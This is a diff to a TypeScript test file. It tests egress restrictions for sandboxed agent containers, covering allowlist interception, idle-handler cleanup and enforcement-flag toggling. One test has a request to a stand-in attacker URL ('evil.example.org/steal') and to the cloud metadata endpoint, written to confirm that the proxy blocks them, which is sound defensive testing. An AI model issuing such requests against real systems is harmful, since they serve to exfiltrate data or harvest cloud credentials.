@@ -12,7 +12,11 @@ vi.mock('cloudflare:workers', () => ({
     env: unknown;
     constructor(ctx: unknown, env: unknown) { this.ctx = ctx; this.env = env; }
   },
-  WorkerEntrypoint: class {},
+  WorkerEntrypoint: class {
+    ctx: unknown;
+    env: unknown;
+    constructor(ctx: unknown, env: unknown) { this.ctx = ctx; this.env = env; }
+  },
 }));
 vi.mock('../../application/observability/durableErrorReporter', () => ({ createDurableErrorReporter: () => vi.fn() }));
 vi.mock('../../application/runtime/previewSessions', () => ({ PREVIEW_CONTROL_STOP_PATH: '/__preview_control__/stop' }));
@@ -36,7 +40,7 @@ function fakeCtx(name: string | undefined, opts: { running?: boolean; persisted?
   const ctx = {
     id: { name, toString: () => `id-${name ?? 'nameless'}` },
     storage: {
-      kv: { get: vi.fn((k: string) => kv.get(k)), put: vi.fn((k: string, v: unknown) => { kv.set(k, v); }) },
+      kv: { get: vi.fn((k: string) => kv.get(k)), put: vi.fn((k: string, v: unknown) => { kv.set(k, v); }), delete: vi.fn((k: string) => kv.delete(k)) },
       sql: { exec: vi.fn(() => []) },
       get: vi.fn(async (k: string) => kv.get(k)),
       put: vi.fn(async (k: string, v: unknown) => { kv.set(k, v); }),
@@ -154,6 +158,116 @@ describe('real Container class', () => {
       new AgentContainerDO(f.ctx as never, {} as never);
       await f.settled();
       expect(f.container.destroy).not.toHaveBeenCalled();
+    });
+  });
+
+  // The library writes a per-host (zero-host) config for EVERY instance once any exec instance has
+  // registered in the isolate. That bare config must not make a scan or managed host "ours".
+  describe.each([['named non-exec', 'webscan:1'], ['nameless', undefined]])('scan / managed host with a bare library config + running container (%s)', (_label, name) => {
+    const bare = () => ({ [OUTBOUND_KEY]: { outboundByHostOverrides: undefined, hasInterceptAllRegistration: undefined } });
+
+    it('is neither destroyed nor restricted', async () => {
+      const AgentContainerDO = await load();
+      const f = fakeCtx(name, { running: true, persisted: bare() });
+      const container = new AgentContainerDO(f.ctx as never, { SANDBOX_EGRESS_ENFORCE: 'true' } as never);
+      await f.settled();
+      expect(f.container.destroy).not.toHaveBeenCalled();
+      expect(container.enableInternet).toBe(true);
+      expect((container as unknown as { outboundHandlerOverride?: unknown }).outboundHandlerOverride).toBeUndefined();
+    });
+
+    it('is not put under the allowlist or destroyed by the idle handler either', async () => {
+      const AgentContainerDO = await load();
+      const f = fakeCtx(name, { running: true, persisted: bare() });
+      const container = new AgentContainerDO(f.ctx as never, { SANDBOX_EGRESS_ENFORCE: 'true' } as never);
+      await f.settled();
+      const stop = vi.spyOn(container, 'stop').mockResolvedValue(undefined); // the idle handler's normal outcome
+      await container.onActivityExpired();
+      expect(f.container.destroy).not.toHaveBeenCalled();
+      expect(stop).toHaveBeenCalledTimes(1);
+    });
+  });
+
+  it('the idle handler destroys a restricted container that never recorded a restricted start, instead of keeping it alive', async () => {
+    const AgentContainerDO = await load();
+    const f = fakeCtx('exec:9');
+    const container = new AgentContainerDO(f.ctx as never, { SANDBOX_EGRESS_ENFORCE: 'true' } as never);
+    await f.settled();
+    f.container.running = true; // e.g. a start after a timed-out destroy left it up, marker absent
+    f.container.destroy.mockClear();
+    const renew = vi.spyOn(container, 'renewActivityTimeout');
+    await container.onActivityExpired();
+    expect(f.container.destroy).toHaveBeenCalledTimes(1);
+    expect(renew).not.toHaveBeenCalled();
+  });
+
+  // ON, then OFF, then ON: with the flag off the library dropped our override and re-persisted
+  // intercept-all with NO handler. Rebuilt with the flag on again it must not fall through to open.
+  describe.each([['named exec:9', 'exec:9'], ['nameless (EGRESS_KEY persisted)', undefined]])('rebuild after an ON, OFF, ON toggle (%s)', (_label, name) => {
+    const toggled = () => ({
+      [OUTBOUND_KEY]: { outboundByHostOverrides: undefined, hasInterceptAllRegistration: true },
+      egressPolicy: { executionId: 9, internalHost: 'api.builderforce.ai' },
+      egressStartedRestricted: true,
+    });
+
+    it('restores internet-off and the allowlist override synchronously, so the applied interception is restricted', async () => {
+      const AgentContainerDO = await load();
+      const f = fakeCtx(name, { running: true, persisted: toggled() });
+      const container = new AgentContainerDO(f.ctx as never, { SANDBOX_EGRESS_ENFORCE: 'true' } as never);
+      expect(container.enableInternet).toBe(false);
+      await f.settled();
+      expect(f.proxy).toHaveBeenCalled();
+      const props = (f.proxy.mock.calls[0] as unknown as [{ props: { enableInternet: boolean; interceptAll: boolean; outboundHandlerOverride?: { method: string; params?: { executionId: number } } } }])[0].props;
+      expect(props.enableInternet).toBe(false);
+      expect(props.interceptAll).toBe(true);
+      expect(props.outboundHandlerOverride?.method).toBe('egressAllowlist');
+      expect(props.outboundHandlerOverride?.params?.executionId).toBe(9);
+    });
+  });
+
+  it('the captured ContainerProxy props drive a real ContainerProxy.fetch: a disallowed host is refused, an allowed one passes', async () => {
+    const AgentContainerDO = await load();
+    const { ContainerProxy } = await import('@cloudflare/containers');
+    const f = fakeCtx('exec:9');
+    const container = new AgentContainerDO(f.ctx as never, { SANDBOX_EGRESS_ENFORCE: 'true' } as never);
+    await f.settled();
+    await container.setOutboundHandler('egressAllowlist', { executionId: 9, internalHost: 'api.builderforce.ai' });
+    const props = (f.proxy.mock.calls.at(-1) as unknown as [{ props: unknown }])[0].props;
+    const proxy = new ContainerProxy({ props } as never, {} as never);
+    vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const upstream = vi.fn(async (_r: Request) => new Response('ok'));
+    vi.stubGlobal('fetch', upstream);
+    try {
+      const denied = await proxy.fetch(new Request('https://evil.example.org/steal'));
+      expect(denied.status).toBe(403);
+      expect(await denied.text()).toContain('evil.example.org');
+      expect((await proxy.fetch(new Request('http://169.254.169.254/latest/meta-data/'))).status).toBe(403);
+      expect(upstream).not.toHaveBeenCalled();
+      const allowed = await proxy.fetch(new Request('https://registry.npmjs.org/left-pad'));
+      expect(allowed.status).toBe(200);
+      expect(upstream).toHaveBeenCalledTimes(1);
+    } finally { vi.unstubAllGlobals(); }
+  });
+
+  describe('enforcement OFF: our own stale interception config', () => {
+    const ours = () => ({ [OUTBOUND_KEY]: { outboundHandlerOverride: { method: 'egressAllowlist', params: {} }, hasInterceptAllRegistration: true } });
+
+    it('is deleted before super() when the container is not running, restoring pre-flag behaviour', async () => {
+      const AgentContainerDO = await load();
+      const f = fakeCtx('exec:9', { running: false, persisted: ours() });
+      const container = new AgentContainerDO(f.ctx as never, {} as never);
+      await f.settled();
+      expect(f.kv.has(OUTBOUND_KEY)).toBe(false);
+      expect(container.usingInterception).toBe(false);
+      expect(f.proxy).not.toHaveBeenCalled();
+    });
+
+    it('is kept while a container is running (the library re-applies it to the live container)', async () => {
+      const AgentContainerDO = await load();
+      const f = fakeCtx('exec:9', { running: true, persisted: ours() });
+      new AgentContainerDO(f.ctx as never, {} as never);
+      await f.settled();
+      expect(f.kv.has(OUTBOUND_KEY)).toBe(true);
     });
   });
 
